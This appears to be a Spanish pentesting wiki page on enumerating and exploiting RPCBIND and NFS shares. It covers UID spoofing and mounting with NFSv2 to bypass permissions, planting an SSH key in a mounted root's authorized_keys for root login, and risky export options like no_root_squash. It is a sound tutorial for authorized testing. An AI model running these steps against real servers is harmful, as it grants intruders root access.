---
description: >-
  Explotar los servicios RPCBIND y NFS en conjunto para obtener acceso a
  archivos compartidos.
---

# 111, 2049 - RPCBIND Y NFS

## ¿**QUE ES NFS?**

### Información básica

Network File System o NFS por sus siglas en inglés, es un protocolo para un sistema de archivos distribuido, el cual permite a un usuario en una computadora cliente el acceso hacia archivos a través de la red como si accediera a un almacenamiento local.

Es un servicio de cliente-servidor y, aunque tiene el mismo propósito que SMB no se habla con SMB.

El protocolo NFS no tiene ningún mecanismo de autenticación o autorización. La autorización se da con la información disponible en el sistema de archivos del servidor. Este se encarga de traducir la información de usuario provista por el cliente a la que el sistema de archivos entiende para comprobar si el usuario tiene autorización.

La autenticación más común es via UNIX UID / GID y miembros de grupos.&#x20;

{% hint style="danger" %}
El problema es que muchas veces el servidor y el cliente no tienen mapeados de la misma manera los UID / GID. Esto significa que el grupo NFS\_USERS no tiene por qué tener el mismo GID en el servidor que en el cliente. \
Esto puede dar lugar a que los miembros de un grupo diferente del cliente sean los que pueden acceder a los archivos compartidos.
{% endhint %}

**Puerto por defecto: 2049**

### Versiones

| Versión | Características                                                                                                                                                                                                                                                                                              |
| :-----: | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `NFSv2` | <p>Es es más viejo pero es soportado por muchos sistemas.</p><p>Fue inicialmente operado por UDP.</p>                                                                                                                                                                                                        |
| `NFSv3` | <p>Tiene más características, incluyendo:</p><p></p><p>Archivos de tamaño variable.</p><p>Mejor sistema de reporte de errores.</p><p>No es completamente compatible con NFSv2</p>                                                                                                                            |
| `NFSv4` | <p>Incluye Kerberos</p><p>Funciona con firewalls y en internet</p><p>No necesita mapeado de puertos</p><p>soporta ACLs</p><p>Acepta operaciones en base al estado</p><p>Mejora el rendimiento</p><p>Mejora la seguridad</p><p></p><p>Es la primera versión que tiene un protocolo desarrollado como tal.</p> |

## **¿QUE ES RPCBIND?**

&#x20;   RPC o Remote Procedure Call es una técnica para construir sistema distribuidos, y aplicaciones cliente / servidor. Básicamente permite a un programa sobre una máquina llamar a una subrutina sobre otra máquina. RPC no es un protocolo de transporte; en lugar de ello, es un método para utilizar características existentes de una comunicación de una manera transparente. En servidores Unix o similares se debe ser conscientes de la aplicaciones que utilizan RPC.

**Puerto por defecto: 111**

## ENUMERACIÓN

### Nmap scripts

```
nfs-ls # Lista los discos y comprueba permisos.
nfs-showmount #Como el comando showmount.
nfs-statfs #Muestra estadísticas del disco compartido.
```

### Montar un recurso

**`rpcinfo -p ip`**\
La opción “-p” evalúa al portmapper del host, e imprime una lista de todos los programas RPC registrados.

**`showmount -e ip`**\
Se utiliza el comando “showmount” para mostrar información de montaje sobre un servidor NFS. La opción “-e” muestra la lista de exportación del servidor NFS.

**`mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock`**

Si la “/” raíz del sistema de archivos del objetivo de evaluación está siendo exportado, entonces es factible montar localmente este sistema de archivos. Con el comando "mount" se utiliza la opción “-t” para indicar el tipo del sistema de archivos a montar. La opción “-o” define otras opciones, para este presente ejemplo el uso de la opción “nolock” permite a las aplicaciones bloquear archivos, pero tales bloqueos proporcionan exclusión únicamente contra otras aplicaciones ejecutándose en el mismo cliente.

## PERMISOS

En el caso de que se haya montado un recurso en el que solo un usuario con un UID concreto tenga permisos, podemos generar en nuestro sistema un usuario con el mismo UID y así obtener permisos.

{% hint style="warning" %}
**NFSv4** tiene un sistema de seguridad que impide ver desde otro host el UID del usuario propietario. En ocasiones se pueden utilizar varias versiones de NFS, para usar una anterior utilizamos -o vers=2.\
\
**`mount -t nfs -o vers=2 ip:ruta`**
{% endhint %}

## EXPLOTACIÓN

### **EXPLOTANDO AUTHORIZED\_KEYS**

Una vez en esta carpeta compartida y si el host tiene el puerto 22 abierto (ssh) podemos generar un par de claves rsa (sabemos cuales acepta gracias al resultado de nmap) con ssh-keygen y después incluimos la clave publica en el archivo ./.ssh/authorized\_keys

**`ssh-keygen`**

**`cat /tmp/id_rsa.pub >> FSremoto/root/.ssh/authorized_keys`**

**`ssh -i /tmp/id_rsa root@192.168.0.X ssh user@ip`**

## Explotando configuraciones peligrosas

#### Archivos de configuración

```
/etc/exports
/etc/lib/nfs/etab
```

#### Configuraciones peligrosas

* `rw` -> Permiso de Lectura y Escritura.
* `insecure` -> Se utilizarán puertos por encima del 1024.
* `nohide` ->  Si otro sistema de archivos ha sido montado en un directorio exportado, este directorio será exportado con sus propias entradas.
* `no_root_squash` -> Todos los archivos creados por root siguen teniendo UID/GID 0. Si está desactivado, al usuario root se le asigna un usuario nfsnobody para evitar abusar de SUIDs.
* `no_all_squash`

## ESCALADA DE PRIVILEGIOS

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe" %}
